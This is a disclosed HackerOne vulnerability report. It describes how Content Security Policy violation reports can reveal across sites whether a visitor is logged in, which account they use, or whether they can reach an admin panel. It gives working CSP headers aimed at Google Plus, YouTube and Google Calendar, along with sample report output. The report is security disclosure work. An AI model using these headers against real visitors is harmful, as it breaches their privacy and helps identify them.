# Cross-site information assertion leak via Content Security Policy

## Report Details
- **Report ID**: 16910
- **URL**: https://hackerone.com/reports/16910
- **State**: Closed
- **Severity**: N/A
- **Submitted**: 2014-06-18T22:31:04.534Z
- **Disclosed**: 2018-09-05T02:23:54.114Z

## Reporter
- **Username**: zemnmez
- **Name**: N/A

## Team
- **Name**: N/A
- **Handle**: ibb

## Vulnerability Information
It is possible to test for the satisfaction of certain assertions across origins by abuse of Content Security Policy. These could be assertions such as 'is the client logged into this website', or 'is the client logged in as this user', or 'does the client have access to these panels'. This general exploit affects a very large portion of non-static websites.

Content Security Policy allows an endpoint to define certain controls on where specific kinds of content can be located, and most importantly allows the endpoint to define an endpoint where trespasses should be reported.

Here is an example, to leak the result of the assertion 'is the user logged in as X' on Google Plus:

Here is an example exploit flow to work out if the current user is 'Zemnmez', https://plus.google.com/106624718886599931522/.

The user is directed to an endpoint (ib) returning Content-Type text/html, an HTML image tag of src: https://plus.google.com/me/posts and a header:

Content-Security-Policy:default-src *; img-src https://plus.google.com/me/posts https://plus.google.com/106624718886599931522/posts; report-uri ib

If the user is Zemnmez, the assertion does not fail and no report is generated since the image resolves to https://plus.google.com/106624718886599931522/posts which passes the Content Security Policy. If the user is not Zemnmez, the Content Security Policy sends a report back to the endpoint indicating that the policy was violated.

The report is sent back to 'ib' and looks like this:

blocked-uri: "https://plus.google.com"
document-uri: "[...]"
original-policy: "default-src *; img-src https://plus.google.com/me/posts https://plus.google.com/106624718886599931522/posts; report-uri ib"
referrer: ""
status-code: 200
violated-directive: "img-src https://plus.google.com/me/posts https://plus.google.com/106624718886599931522/posts"

A similar exploit can be demonstrated for YouTube:

Youtube exposes a video enhancement interface for videos at: https://www.youtube.com/enhance?feature=vm&v=[videoid]

If the current account accessing the video is not the owner of the video, they are directed to /oops.

Here is a video owned by me:

https://www.youtube.com/watch?v=G_bnKTH3Lts

The corresponding enhancement URL would be: https://www.youtube.com/enhance?feature=vm&v=G_bnKTH3Lts

Given the CSP header:

Content-Security-Policy:default-src *; img-src https://www.youtube.com/enhance?feature=vm&v=G_bnKTH3Lts; report-uri ib

If the user is not logged in as me, this breaks the content security policy when "https://www.youtube.com/enhance?feature=vm&v=G_bnKTH3Lts" is embedded as an image, notifying the attacker that the assertion is false.

As another example, here is an exploit flow for the assertion 'is the user logged in on Google':

 When the user is not logged in, http://calendar.google.com redirects to http://accounts.google.com.

An attacker can load a webpage with a Content-Security-Policy header whitelisting calendar.google.com, google.com and www.google.com but not accounts.google.com, and specifying that incidents should be reported.

By embedding an image with the URL http://calendar.google.com, the attacker can detect if the user is logged into Google or not.

This can be exploited by an endpoint with the image and this header:

Content-Security-Policy:default-src *; img-src calendar.google.com google.com www.google.com; report-uri ib

Where /ib is the relative URL of the endpoint. When not logged into Google, this request payload was sent to my server:

blocked-uri: "https://accounts.google.com"
document-uri: "http://[...]/ib"
original-policy: "default-src *; img-src calendar.google.com google.com www.google.com; report-uri ib"
referrer: ""
status-code: 200
violated-directive: "img-src calendar.google.com google.com www.google.com"


The general modus is to not whitelist an endpoint that may occur as the result of some action, and use the report feature to detect what path was taken by the action. To assert that a user has access to a control panel, a CSP can be set up that specifies only the control panel is an allowed image. For most control panels, inadequate privileges cause a Location header to be sent to a login page or other endpoint. This is detected and sent back to the server as a report.

## Attachments
No attachments
